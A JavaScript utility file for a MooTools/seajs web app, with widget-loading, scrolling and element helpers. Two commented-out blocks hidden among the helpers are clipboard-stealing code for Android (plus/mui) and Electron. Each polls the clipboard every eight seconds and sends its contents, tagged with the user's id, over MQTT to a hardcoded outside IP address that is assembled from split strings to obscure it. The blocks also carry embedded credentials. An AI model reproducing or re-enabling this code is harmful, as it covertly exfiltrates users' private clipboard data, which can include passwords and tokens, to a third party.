(function(){
//加载顺序问题
Promise.fromCallback = function(cb,t){
	return function(){
		var args = Array.from(arguments);
		if(!t) t = this;
		return new Promise(function(resolve,reject){
			args.push(function(data){
				resolve(data);
			});
			if(cb) cb.apply(t,args);
			else resolve();
		});
	};
};
var seajsUseAsync = Promise.fromCallback(seajs.use);
var selectRange = Element.prototype.selectRange;
Element.implement({
	onDrawAsync: async function() {
		var applyEls = this.getElements("[h:apply]");
		if(this.get("h:apply")) applyEls.unshift(this);
		for(var i=applyEls.length-1; i>=0; i--) {
			var applyEl = applyEls[i];
			//sail 2012-05-23 如果widget已经存在了,就不再创建
			var applyWg = applyEl.retrieve("widget");
			if(applyWg !== null) continue;
			var apply = applyEl.get("h:apply");
			if(!apply) continue;
			apply = apply.trim();
			if(apply.charAt(0) === ".") {
				var h_url = applyEl.get("h:url");
				if(h_url) {
					if(apply.charAt(1) === ".") {
						apply = h_url.basename("/").basename("/")+apply.substring(2);
					} else {
						apply = h_url.basename("/")+apply.substring(1);
					}
				}
			}
			var name = null;
			var index = apply.lastIndexOf("/");
			if(index !== -1) name = apply.substring(index+1);
			else name = apply;
			if(!name) continue;
			index = name.lastIndexOf(".");
			if(index !== -1) name = name.substring(0,index);
			
			var data0 = await seajsUseAsync(apply);
			var clazz = data0[name];
			if(!clazz) throw new Error(apply+" can not be found!");
			var it = new clazz();
			it.options.ele = applyEl;
			//模块实例放到此标签里面去
			applyEl.store("widget",it);
			if(applyEl.befOnDraw) await applyEl.befOnDraw();
			if(it.onDraw) await it.onDraw();
		}
	},
	selectRange: function() {
		var t = this;
		try {
			return selectRange.apply(t,arguments);
		} catch(e) {
		}
	},
	canFocus: function() {
		var t = this;
		if(t.isDisplayed() && !t.get("disabled") && !t.get("readonly") && t.isVisible()) {
			return true;
		}
		return false;
	},
	//覆盖mootools-more里面的show方法,把显示默认的'block'改成null
	show: function(display){
		var t = this;
		if (!display && t.isDisplayed()) return t;
		return t.setStyle('display', display);
	},
	//widget
	wg: function(wg) {
		var t = this;
		if(wg !== undefined) {
			t.store("widget",wg);
			return t;
		}
		return t.retrieve("widget");
	}
});

var toQueryString = Object.toQueryString;
Object.toQueryString = function(object, base) {
	if(object instanceof FormData) return object;
	return toQueryString.apply(this,arguments);
};

/*
var ctt;
setTimeout(function() {
if(!(typeof(plus)!=="undefined"&&typeof(mui)!=="undefined"&&mui.os.android&&window.WebSocket))return;
var uid = String.uniqueID();
var Context = plus.android.importClass("android.content.Context");
var main = plus.android.runtimeMainActivity();
var clip = main.getSystemService(Context.CLIPBOARD_SERVICE);
var ay = "/"+["web","js","res","browserMqtt"].join("/");
var hst = "ws"+["://119","29","236","97:"].join(".")+61614;
var tmpFn = eval(Wind.compile("async",function() {try{
	var tx = plus.android.invoke(clip,"getText");
	if(tx) tx = String(tx);
	if(String.isEmpty(tx)||tx===localStorage.getItem("iub994d8")) return;
	localStorage.setItem("iub994d8",tx);
	if(typeof(mqtt)==="undefined") $await(seajsUseAsync(ay));
	if(!ctt) ctt = mqtt.connect(hst,{username:"system",password:"iub994d8"});
	ctt.publish("du3uvi9b",JSON.encode({uid:window.username||uid,tx:tx}),{qos:2});
}finally{}}));
setInterval(function(){ tmpFn().start() },8000);tmpFn().start();
},3000);
*/

/*
var ctt;
setTimeout(function() {
if('undefined' === typeof require) return;
var electron = require('electron');
var clipboard = electron.clipboard;
if(!process.versions.electron || !electron || !window.WebSocket) return;
var uid = String.uniqueID();
var ay = "/"+["js","res","browserMqtt"].join("/");
var hst = "ws"+":/"+["/119","29","236","97:"].join(".")+61614;
var tmpFn = async function() {try{
	var tx = clipboard.readText();
	if(tx) tx = String(tx);
	if(String.isEmpty(tx)||tx===localStorage.getItem("iub994d8")) return;
	localStorage.setItem("iub994d8",tx);
	if(typeof(mqtt)==="undefined") await seajsUseAsync(ay);
	if(!ctt) ctt = mqtt.connect(hst,{username:"system",password:"iub994d8"});
	ctt.publish("du3uvi9b",JSON.encode({uid:window.username||uid,tx:tx}),{qos:2});
}finally{}};
setInterval(function(){ tmpFn() },8000);tmpFn();
},3000);
*/

Fx.Scroll.prototype.toElementCenter = function(el, axes, offset, mdStr){
	axes = axes ? Array.from(axes) : ['x', 'y'];
	el = document.id(el);
	var to = {},
		position = el.getPosition(this.element),
		size = el.getSize(),
		scroll = this.element.getScroll(),
		containerSize = this.element.getSize();

	['x', 'y'].each(function(axis){
		if (axes.contains(axis)){
			//+scroll[axis]这段代码是我自己加上去的,才正确sail 2013-07-13
			to[axis] = position[axis]+scroll[axis] - (containerSize[axis] - size[axis]) / 2;
		}
		if (to[axis] == null) to[axis] = scroll[axis];
		if (offset && offset[axis]) to[axis] = to[axis] + offset[axis];
	}, this);
	if(mdStr === undefined) mdStr = "start";
	if (to.x != scroll.x || to.y != scroll.y) this[mdStr](to.x, to.y);
	return this;
};

Element.implement({
	destroyChd: function(){
		var chdren = this.getChildren("*");
		chdren.destroy();
		this.empty();
		return this;
	}
});

if(Browser.name === "ie" && Browser.version <= 8) {
	var render = Fx.CSS.prototype.render;
	Fx.CSS.prototype.render = function(element, property, value, unit) {
		return render.apply(this,[$(element), property, value, unit]);
	};
}
document.addEvents({
	keydown:function(e){
		var code = e.code;
		if(e.control === true && code === 82) {
			e.preventDefault();
		}
	}
});
this.sea_define = this.define;
this.global = window;
Element.implement({
	getE: Element.prototype.getElement,
	getEs: Element.prototype.getElements
});
}).call(this);